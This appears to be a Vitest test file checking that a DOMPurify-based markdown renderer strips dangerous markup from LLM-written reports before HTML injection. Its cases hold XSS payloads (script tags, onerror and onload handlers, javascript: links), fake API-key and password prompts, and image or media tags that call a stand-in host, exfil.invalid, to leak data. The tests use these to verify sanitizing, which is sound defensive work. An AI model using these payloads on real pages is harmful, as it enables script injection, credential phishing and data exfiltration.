// @vitest-environment happy-dom
// renderMarkdown turns LLM-written markdown (reports, advisory) into HTML that is
// injected with dangerouslySetInnerHTML. These tests need a DOM: without a window,
// DOMPurify returns its input unchanged.
//
// happy-dom's NodeIterator skips the DOM's node-removal steps, so under happy-dom
// DOMPurify stops walking at the first element it removes (browsers walk on).
// Each case therefore holds at most one element to remove, nested ones included;
// the last test fails once happy-dom walks on, and the cases can then be merged.
//
// DOMPurify reads nodeName through the Node.prototype getter. Browsers define
// nodeName there once for every node type; happy-dom overrides it on
// Element.prototype and leaves the Node.prototype getter returning '' for
// elements, so DOMPurify would see every element as an unknown tag. The hoisted
// shim below restores the browser behaviour before DOMPurify captures the getter
// on import; the nodeName test at the end fails once happy-dom no longer needs it.
import { describe, expect, it, vi } from 'vitest';
import { renderMarkdown } from '../../lib/markdown';

const nodeNameShimmed = vi.hoisted(() => {
  const base = Object.getOwnPropertyDescriptor(Node.prototype, 'nodeName');
  const baseGet = base?.get;
  if (!base || !baseGet || baseGet.call(document.createElement('p')) !== '') return false;
  Object.defineProperty(Node.prototype, 'nodeName', {
    ...base,
    get(this: Node): string {
      let proto = Object.getPrototypeOf(this);
      while (proto && proto !== Node.prototype) {
        const own = Object.getOwnPropertyDescriptor(proto, 'nodeName')?.get;
        if (own) return own.call(this) as string;
        proto = Object.getPrototypeOf(proto);
      }
      return baseGet.call(this) as string;
    },
  });
  return true;
});

// Everything marked emits for ordinary markdown, and nothing else.
const ALLOWED_TAGS = [
  'p', 'br', 'hr', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'ul', 'ol', 'li',
  'strong', 'em', 'del', 'code', 'pre', 'blockquote', 'a',
  'table', 'thead', 'tbody', 'tr', 'th', 'td',
];
const ALLOWED_ATTRS = ['href', 'title', 'align', 'start'];

function mount(html: string): HTMLElement {
  const host = document.createElement('div');
  host.innerHTML = html;
  return host;
}

describe('renderMarkdown — rendering', () => {
  it('returns an empty string for empty input', () => {
    expect(renderMarkdown('')).toBe('');
  });

  it('renders headings, emphasis and lists', () => {
    const host = mount(renderMarkdown('# Title\n\n**bold** and *it*\n\n- a\n- b'));
    expect(host.querySelector('h1')?.textContent).toBe('Title');
    expect(host.querySelector('strong')?.textContent).toBe('bold');
    expect(host.querySelectorAll('li')).toHaveLength(2);
  });

  it('keeps ordinary https links', () => {
    const host = mount(renderMarkdown('[docs](https://example.com/a)'));
    expect(host.querySelector('a')?.getAttribute('href')).toBe('https://example.com/a');
  });

  it('renders markdown tables', () => {
    const host = mount(renderMarkdown('| a | b |\n|:-:|--:|\n| 1 | 2 |'));
    expect(host.querySelectorAll('td')).toHaveLength(2);
  });

  it('keeps list numbering, column alignment, code blocks, quotes and link titles', () => {
    const host = mount(
      renderMarkdown(
        [
          '## Signals',
          '',
          '> The spread is ~~tight~~ attractive',
          '',
          '3. third',
          '4. fourth',
          '',
          '```text',
          'QQQX 4.2B',
          '```',
          '',
          '---',
          '',
          '| a | b |',
          '|:-:|--:|',
          '| 1 | 2 |',
          '',
          '[filing](https://example.com/f "Merger filing")',
        ].join('\n'),
      ),
    );
    expect(host.querySelector('h2')?.textContent).toBe('Signals');
    expect(host.querySelector('blockquote del')?.textContent).toBe('tight');
    expect(host.querySelector('ol')?.getAttribute('start')).toBe('3');
    expect(host.querySelector('pre > code')?.textContent).toBe('QQQX 4.2B\n');
    expect(host.querySelector('hr')).not.toBeNull();
    expect(host.querySelector('th')?.getAttribute('align')).toBe('center');
    expect(host.querySelectorAll('td')[1]?.getAttribute('align')).toBe('right');
    expect(host.querySelector('a')?.getAttribute('title')).toBe('Merger filing');
  });
});

describe('renderMarkdown — dangerous markup is removed', () => {
  it.each([
    ['inline script tag', '<script>window.__xss = 1</script>hello'],
    ['img onerror', '<img src="x" onerror="window.__xss = 1">'],
    ['svg onload', '<svg onload="window.__xss = 1"><circle r="1"/></svg>'],
    ['iframe srcdoc', '<iframe srcdoc="<script>window.__xss=1</script>"></iframe>'],
    ['javascript: markdown link', '[click](javascript:window.__xss=1)'],
    ['javascript: html link', '<a href="javascript:window.__xss=1">x</a>'],
    ['data: html link', '<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>'],
    ['event handler on div', '<div onclick="window.__xss=1">x</div>'],
    ['style tag', '<style>body{background:url(javascript:alert(1))}</style>'],
    ['form', '<form action="javascript:alert(1)"><button>go</button></form>'],
  ])('%s', (_label, source) => {
    const html = renderMarkdown(source);
    const host = mount(html);
    expect(host.querySelector('script, iframe, style, form, object, embed')).toBeNull();
    for (const el of Array.from(host.querySelectorAll('*'))) {
      for (const attr of Array.from(el.attributes)) {
        expect(attr.name.startsWith('on')).toBe(false);
        expect(attr.value.toLowerCase()).not.toMatch(/^\s*(javascript|data|vbscript):/);
      }
    }
    expect(html.toLowerCase()).not.toContain('javascript:');
  });

  it.each([
    ['a task-list checkbox', '- [x] done'],
    ['a markdown image', '![chart](https://exfil.invalid/c.png "chart")'],
    ['a code block language class', '```js\nrun()\n```'],
    [
      'a div with class, id, data and aria attributes',
      '<div class="ob-backdrop" id="root" data-state="fail" aria-hidden="true">cover</div>',
    ],
  ])('keeps only the tags and attributes marked emits: %s', (_label, source) => {
    const elements = Array.from(mount(renderMarkdown(source)).querySelectorAll('*'));
    const tags = new Set(elements.map((el) => el.tagName.toLowerCase()));
    const attrs = new Set(elements.flatMap((el) => Array.from(el.attributes, (a) => a.name)));
    expect([...tags].filter((tag) => !ALLOWED_TAGS.includes(tag))).toEqual([]);
    expect([...attrs].filter((attr) => !ALLOWED_ATTRS.includes(attr))).toEqual([]);
  });
});

describe('renderMarkdown — output can neither restyle the dashboard nor fake a form', () => {
  it('drops inline style attributes', () => {
    const host = mount(renderMarkdown('<div style="position:fixed;inset:0">cover</div>'));
    expect(host.querySelector('[style]')).toBeNull();
    expect(host.textContent).toContain('cover');
  });

  it.each([
    ['div', '<div class="ob-backdrop" id="root" data-state="fail">cover</div>'],
    ['paragraph', '<p class="ob-backdrop" id="root" data-state="fail">cover</p>'],
  ])("drops class, id and data attributes, so output cannot reuse the app's CSS: %s", (
    _label,
    source,
  ) => {
    const host = mount(renderMarkdown(source));
    expect(host.querySelector('[class], [id], [data-state]')).toBeNull();
    expect(host.textContent).toContain('cover');
  });

  it.each([
    ['password input', 'Re-enter your API key: <input type="password" name="key">'],
    ['button', '<button>Unlock</button>'],
    ['textarea', '<textarea>notes</textarea>'],
    ['select', '<select name="account"></select>'],
    ['option', '<option>ZZZT</option>'],
  ])('drops form controls, so output cannot render a fake prompt: %s', (_label, source) => {
    const host = mount(renderMarkdown(source));
    expect(host.querySelector('input, button, textarea, select, option')).toBeNull();
  });
});

describe('renderMarkdown — opening a report or advisory loads nothing', () => {
  it.each([
    ['markdown image', '![chart](https://exfil.invalid/c.png?h=ZZZT)'],
    [
      'html image with srcset',
      '<img src="https://exfil.invalid/c.png" srcset="https://exfil.invalid/c2.png 2x">',
    ],
    [
      'video poster and source',
      '<video poster="https://exfil.invalid/p.png"><source src="https://exfil.invalid/v.mp4"></video>',
    ],
    ['audio', '<audio src="https://exfil.invalid/a.mp3" autoplay></audio>'],
    [
      'table background',
      '<table background="https://exfil.invalid/bg.png"><tr><td>x</td></tr></table>',
    ],
    ['svg image', '<svg><image href="https://exfil.invalid/i.png"></image></svg>'],
    ['link prefetch', '<link rel="prefetch" href="https://exfil.invalid/x">'],
  ])('%s', (_label, source) => {
    const host = mount(renderMarkdown(source));
    expect(host.querySelector('img, picture, video, audio, source, svg, image, link')).toBeNull();
    expect(host.innerHTML).not.toContain('exfil.invalid');
  });
});

describe('renderMarkdown — test environment', () => {
  it.fails('happy-dom: sanitizing continues past the first removed element', () => {
    const host = mount(renderMarkdown('<img src="x"><button>Unlock</button>'));
    expect(host.querySelector('button')).toBeNull();
  });

  it('happy-dom: Node.prototype.nodeName still needs the shim at the top of this file', () => {
    expect(nodeNameShimmed).toBe(true);
  });
});
